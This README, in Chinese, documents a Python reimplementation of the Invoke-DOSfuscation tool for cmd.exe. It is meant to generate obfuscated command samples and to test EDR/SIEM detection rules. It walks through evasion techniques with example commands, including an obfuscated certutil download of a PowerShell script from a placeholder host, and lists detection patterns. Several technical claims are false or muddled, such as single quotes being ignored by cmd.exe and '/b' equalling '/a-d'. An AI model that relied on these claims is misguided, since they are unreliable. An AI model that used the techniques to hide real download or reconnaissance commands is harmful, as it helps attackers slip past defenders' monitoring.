# cmd-obfuscation

cmd.exe 命令混淆工具，用于生成可用于测试检测规则的混淆样本。

## 来源

本工具基于 [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) 项目，由 [Daniel Bohannon](https://github.com/danielbohannon) 开发。

Invoke-DOSfuscation 是 cmd.exe 命令混淆框架，提供了 5 种核心混淆技术。本 skill 用 Python 重新实现了这些核心算法，并增加了检测模式匹配功能。

## 混淆技术

### 1. EnvVar Encoded（环境变量编码）

使用 `%VAR:~start,len%` 语法从环境变量中提取字符。

```cmd
cmd /C "net%PUBLIC:~4,1%ta%TEMP:~23,1% -a%TEMP:~14,1%%TEMP:~27,1%"
```

**原理**: Windows 环境变量包含各种字符，可以通过偏移量提取任意字符。

### 2. Concatenation（拼接）

使用 SET 变量存储字符串片段，通过 CALL 和延迟扩展拼接执行。

```cmd
cmd /V:ON /C "set X=net&&set Y=stat&&call %X%%Y%"
```

**原理**: cmd.exe 的 `/V:ON` 启用延迟变量扩展，允许在执行时动态拼接字符串。

### 3. Reversal（反转）

将命令反转后存储，用 FOR /L 循环和负索引重新组装。

```cmd
cmd /V:ON /C "FOR /L %i in (11,-1,0) DO set var=!var!!str:~%i,1!"
```

**原理**: FOR /L 循环支持负数步进值，可从后向前遍历索引。

### 4. FOR-coded（FOR循环索引提取）

使用索引数组指定字符位置，通过 FOR 循环提取并拼接。

```cmd
cmd /V:ON /C "FOR %i in (0 4 1 6 1 3) DO set result=!result!!str:~%i,1!"
```

**原理**: FOR 循环迭代预定义的索引数组，支持乱序提取。

### 5. FIN-coded（字符串替换）

使用 `%VAR:old=new%` 语法进行连续字符替换。

```cmd
cmd /V:ON /C "set X=aaaa&&%X:a=n%&&%X:a=e%"
```

**原理**: cmd.exe 支持在变量扩展时进行字符串替换操作。

### 6. Filling Techniques（填充类）

通过在命令中插入无效字符或结构来改变检测特征，同时不影响实际执行。

#### 6.1 Quote Injection（引号填充）

在命令参数中插入单引号，利用 cmd.exe 的引号拼接特性。

```cmd
cmd /C "netstat -a'n'o"
cmd /C "whoam'i /all"
```

**原理**: 单引号在 cmd.exe 中会被当作普通字符处理，拼接在字符串中不影响命令执行。

#### 6.2 Escape Injection（转义字符填充）

在命令中插入 `^` 转义字符。

```cmd
cmd /C "di^r /b"
cmd /C "n^et^stat -a^n^o"
```

**原理**: `^` 是 cmd.exe 的转义字符，在非特殊位置时作为普通字符处理。

#### 6.3 Space Injection（空格填充）

在命令中随机位置插入额外空格。

```cmd
cmd /C "di   r /b"
cmd /C "netstat   -ano"
```

**原理**: cmd.exe 忽略命令与参数之间的多余空格。

#### 6.4 Comma Injection（逗号填充）

使用逗号替代部分空格。

```cmd
cmd /C "dir,/b"
cmd /C "netstat,-ano"
```

**原理**: 在某些情况下逗号可替代空格作为命令分隔符。

#### 6.5 Unicode Injection（Unicode填充）

使用 Unicode 全角字符替代部分字母。

```cmd
cmd /C "ｎｅｔｓｔａｔ -ａｎｏ"
```

**原理**: 全角字符在某些上下文中被当作普通字符处理，改变命令的字节特征。

### 7. Replacement Techniques（替换类）

通过替换命令的组成部分来改变检测特征。

#### 7.1 Option Replacement（选项替换）

将命令选项改为不同写法。

```cmd
cmd /C "dir /b /a-d"  # /b 和 /a-d 都是相同功能的不同表示
cmd /C "netstat -ano" vs "netstat -a -n -o"
```

**原理**: Windows 命令通常支持多种选项格式（单斜杠/双斜杠、缩写/全写）。

#### 7.2 Case Variation（大小写变化）

混合命令的大小写。

```cmd
cmd /C "DiR /B"
cmd /C "nEtStAt -aNo"
```

**原理**: Windows 命令不区分大小写，混合大小写不影响执行但改变字符串特征。

#### 7.3 IP Numerical（IP数值化）

将 IP 地址转换为数字形式。

```cmd
# 127.0.0.1 = 2130706433
cmd /C "ping 2130706433"
```

**原理**: IP 地址可以表示为单个整数，绕过字符串形式的 IP 检测。

#### 7.4 Environment Variable Replacement（环境变量替换）

使用环境变量替代命令中的路径或文件名。

```cmd
cmd /C "%COMSPEC% /C dir"
cmd /C "set x=notepad&&%x%"
```

**原理**: cmd.exe 在执行前会展开环境变量，改变命令的字符串形式。

#### 7.5 Abbreviation（缩写）

使用 Windows 命令的缩写形式。

```cmd
cmd /C "dir /b"  # /b = bare format
cmd /C "netstat -ano"  # -ano 是完整选项
```

**原理**: 许多 Windows 命令支持缩写，如 `/b` = bare format, `-ano` = all numeric output。

## 使用方法

### 命令行

```bash
# 混淆所有技术
python3 cmd_obfuscation.py "netstat -ano" --technique all --level 3

# 指定技术
python3 cmd_obfuscation.py "whoami /all" --technique concat

# 带随机大小写
python3 cmd_obfuscation.py "dir" --level 2 --random-case

# 检测已知模式
python3 cmd_obfuscation.py "FOR /L %i in (11,-1,0) do echo" --detect
```

### Python 模块

```python
from cmd_obfuscation import obfuscate, detect, test_cmd

# 生成混淆命令
results = obfuscate("netstat -ano", technique="all", level=2)
for r in results:
    print(f"[{r['technique']}] {r['command']}")

# 检测模式
matches = detect("FOR /L %i in (11,-1,0) do echo")
print(matches)

# 验证输出
result = test_cmd("netstat -ano", obfuscated_cmd)
print(result['match'])
```

## 参数说明

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `command` | 要混淆的命令 | - |
| `--technique` | 混淆技术: `envvar\|concat\|reverse\|for\|fin\|quote\|escape\|space\|comma\|unicode\|path\|option\|case\|ip\|env\|abbr\|all` | `all` |
| `--level` | 混淆级别 1-3（3最激进） | `2` |
| `--random-case` | 随机化字符大小写 | `False` |
| `--random-caret` | 添加 caret 转义 | `False` |
| `--random-space` | 注入随机空白字符 | `False` |
| `--detect` | 检测模式而非混淆 | `False` |

## 检测模式

内置的检测规则（可用于测试 EDR/SIEM 规则）：

| 模式 | 严重性 | 说明 |
|------|--------|------|
| `FOR_LOOP` | medium | 未混淆的 FOR 循环 |
| `MULTI_SUBSTRING` | low | 多个环境变量子串提取 |
| `CONCAT_SET` | medium | SET 拼接模式 |
| `REVERSAL` | high | FOR /L 反转模式 |
| `CARET_ACCUM` | medium | 过多的 caret 转义 |
| `DELAYED_EXP` | low | 启用延迟扩展 (/V:ON) |
| `WHITESPACE_NOISE` | low | 异常空白字符 |
| `UNICODE_INJECTION` | low | Unicode 全角字符 |
| `QUOTE_INJECTION` | low | 单引号填充 |
| `IP_NUMERIC` | medium | IP 地址数值化 |
| `PATH_TRAVERSAL` | medium | 路径遍历序列 |

## 示例

### 示例 1: 基本混淆

```bash
$ python3 cmd_obfuscation.py "netstat -ano" --technique all --level 2

[
  {"technique": "envvar", "command": "cmd /C \"net%PUBLIC:~4,1%ta%TEMP:~23,1%...\""},
  {"technique": "concat", "command": "cmd /V:ON /C \"set X=net&&set Y=stat&&...\""},
  ...
]
```

### 示例 2: certutil 下载命令

```bash
$ python3 cmd_obfuscation.py "certutil.exe -urlcache -f https://example.org/file.ps1 C:\temp\out" --technique concat --level 3

cmd /V:ON /C "Set 29qx=CErtuTIL.EXe -URLcAcH&&SeT UaXN=E -F HTTps://www.EXam&&..."
```

### 示例 3: 检测能力测试

```bash
$ python3 cmd_obfuscation.py "FOR /L %i in (11,-1,0) do echo test" --detect

[
  {"pattern": "FOR_LOOP", "severity": "medium", "match": "FOR /L %i in"},
  {"pattern": "REVERSAL", "severity": "high", "match": "FOR /L %i in (11,-1,"}
]
```

## 参考

- **原项目**: [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) by [@danielbohannon](https://github.com/danielbohannon)
- **相关演讲**: BH Arsenal 2018 - "Invoke-DOSfuscation: Techniques for Forrest's Spaces"
- **技术博客**: [Daniel Bohannon's Blog](https://www.danielbohannon.com/)
- **Windows 命令行混淆**: [Windows 命令行混淆手法总结](https://www.anquanke.com/post/info/23112) by ConradSun - 包含填充类（Filling）和替换类（Replacement）高级技术

## 许可

本 skill 是 Invoke-DOSfuscation 项目的 Python 再实现，遵循原项目许可。
